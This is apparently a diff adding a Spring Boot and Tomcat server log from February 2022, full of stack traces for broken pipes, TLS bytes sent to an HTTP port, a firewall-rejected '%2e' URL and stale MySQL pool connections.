+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-07 15:17:07.697 ERROR 8250 --- [nio-8081-exec-7] o.a.c.c.C.[Tomcat].[localhost]           : Exception Processing ErrorPage[errorCode=0, location=/error]
+
+org.apache.catalina.connector.ClientAbortException: java.io.IOException: Broken pipe
+	at org.apache.catalina.connector.OutputBuffer.doFlush(OutputBuffer.java:310) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.connector.OutputBuffer.flush(OutputBuffer.java:273) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.connector.CoyoteOutputStream.flush(CoyoteOutputStream.java:118) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.security.web.util.OnCommittedResponseWrapper$SaveContextServletOutputStream.flush(OnCommittedResponseWrapper.java:520) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at java.io.FilterOutputStream.flush(FilterOutputStream.java:140) ~[na:1.8.0_311]
+	at com.fasterxml.jackson.core.json.UTF8JsonGenerator.flush(UTF8JsonGenerator.java:1178) ~[jackson-core-2.11.4.jar!/:2.11.4]
+	at com.fasterxml.jackson.databind.ObjectWriter.writeValue(ObjectWriter.java:1008) ~[jackson-databind-2.11.4.jar!/:2.11.4]
+	at org.springframework.http.converter.json.AbstractJackson2HttpMessageConverter.writeInternal(AbstractJackson2HttpMessageConverter.java:346) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.http.converter.AbstractGenericHttpMessageConverter.write(AbstractGenericHttpMessageConverter.java:104) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor.writeWithMessageConverters(AbstractMessageConverterMethodProcessor.java:277) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.HttpEntityMethodProcessor.handleReturnValue(HttpEntityMethodProcessor.java:219) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.method.support.HandlerMethodReturnValueHandlerComposite.handleReturnValue(HandlerMethodReturnValueHandlerComposite.java:82) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:123) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:878) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:792) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at javax.servlet.http.HttpServlet.service(HttpServlet.java:652) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:320) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:115) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:90) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:118) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:84) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:111) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:158) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:116) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:105) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:215) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:178) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:358) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:271) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:710) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:459) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:384) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:312) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardHostValve.custom(StandardHostValve.java:398) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardHostValve.status(StandardHostValve.java:257) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:179) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+Caused by: java.io.IOException: Broken pipe
+	at sun.nio.ch.FileDispatcherImpl.write0(Native Method) ~[na:1.8.0_311]
+	at sun.nio.ch.SocketDispatcher.write(SocketDispatcher.java:47) ~[na:1.8.0_311]
+	at sun.nio.ch.IOUtil.writeFromNativeBuffer(IOUtil.java:93) ~[na:1.8.0_311]
+	at sun.nio.ch.IOUtil.write(IOUtil.java:65) ~[na:1.8.0_311]
+	at sun.nio.ch.SocketChannelImpl.write(SocketChannelImpl.java:469) ~[na:1.8.0_311]
+	at org.apache.tomcat.util.net.NioChannel.write(NioChannel.java:135) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioBlockingSelector.write(NioBlockingSelector.java:118) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioSelectorPool.write(NioSelectorPool.java:151) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper.doWrite(NioEndpoint.java:1367) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketWrapperBase.doWrite(SocketWrapperBase.java:766) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketWrapperBase.flushBlocking(SocketWrapperBase.java:719) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketWrapperBase.flush(SocketWrapperBase.java:709) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11OutputBuffer$SocketOutputBuffer.flush(Http11OutputBuffer.java:572) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.filters.IdentityOutputFilter.flush(IdentityOutputFilter.java:117) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11OutputBuffer.flush(Http11OutputBuffer.java:220) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.flush(Http11Processor.java:1196) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessor.action(AbstractProcessor.java:402) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.Response.action(Response.java:209) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.connector.OutputBuffer.doFlush(OutputBuffer.java:306) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	... 81 common frames omitted
+
+2022-02-08 04:43:27.722  INFO 8250 --- [nio-8081-exec-6] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xe70x010x000x000xe30x030x03|0xe60xcb0x170x1990xbe0xc10x1a0xdc0x1dDg0xe50xdd0xeeW_,0x030xc80xa90xd10xfc0x960xe730x890xc20x150xd1}0x000x00h0xcc0x140xcc0x130xc0/0xc0+0xc000xc0,0xc00x110xc00x070xc0'0xc0#0xc00x130xc00x090xc0(0xc0$0xc00x140xc00x0a0xcc0x150x000x9e0x000x9f0x00g0x00k0x0030x0090x000x9c0x000x9d0x000x050x000x040x00<0x00=0x00/0x0050xc00x120x000x160x000x0a0x000x030x000x080x000x060x000x140x000x110x000x190x000x170x0020xc00x080x000x120x000x130x000x150x0080x00@0x00f0x00j0x000xa20x000xa30x010x000x00R0x000x000x000x190x000x170x000x000x14114.115.131.120:80810x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x0c0x000x0a0x040x010x040x030x020x010x020x030x020x020xff0x010x000x010x000x000x0f0x000x01...]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-08 20:07:07.246 ERROR 8250 --- [nio-8081-exec-3] o.a.c.c.C.[.[.[/].[dispatcherServlet]    : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception
+
+org.springframework.security.web.firewall.RequestRejectedException: The request was rejected because the URL contained a potentially malicious String "%2e"
+	at org.springframework.security.web.firewall.StrictHttpFirewall.rejectedBlacklistedUrls(StrictHttpFirewall.java:369) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.firewall.StrictHttpFirewall.getFirewalledRequest(StrictHttpFirewall.java:336) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:194) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:178) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:358) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:271) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-08 23:53:25.518  WARN 8250 --- [nio-8081-exec-7] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@5aabfe2a (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-08 23:53:25.526  WARN 8250 --- [nio-8081-exec-7] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@5a70c4ef (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-09 00:20:34.462  WARN 8250 --- [nio-8081-exec-4] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@dfc8e7e (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-09 00:20:34.470  WARN 8250 --- [nio-8081-exec-4] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@53a6cab1 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-09 00:20:34.474  WARN 8250 --- [nio-8081-exec-4] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@744d7a03 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-09 00:31:08.820  WARN 8250 --- [nio-8081-exec-4] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@33c99793 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-09 01:16:32.678  WARN 8250 --- [nio-8081-exec-4] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@3d12187c (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-09 01:16:32.687  WARN 8250 --- [nio-8081-exec-4] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@4a9d1924 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-09 01:16:32.694  WARN 8250 --- [nio-8081-exec-4] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@4b513fa6 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-09 01:16:32.700  WARN 8250 --- [nio-8081-exec-4] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@662d1f48 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-09 04:52:34.171  INFO 8250 --- [nio-8081-exec-2] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000x8d0x010x000x000x890x030x030x090x070x06W0x000xd90x100x8f0x0d0x170xf4#k^0xef0xdb0x07T}y0x100x81*&a0xa90xa490x810xba40xc80x000x000x1a0xc0/0xc0+0xc00x110xc00x070xc00x130xc00x090xc00x140xc00x0a0x000x050x00/0x0050xc00x120x000x0a0x010x000x00F0x000x000x000x140x000x120x000x000x0f114.115.131.1200x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x0a0x000x080x040x010x040x030x020x010x020x030xff0x010x000x01...]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
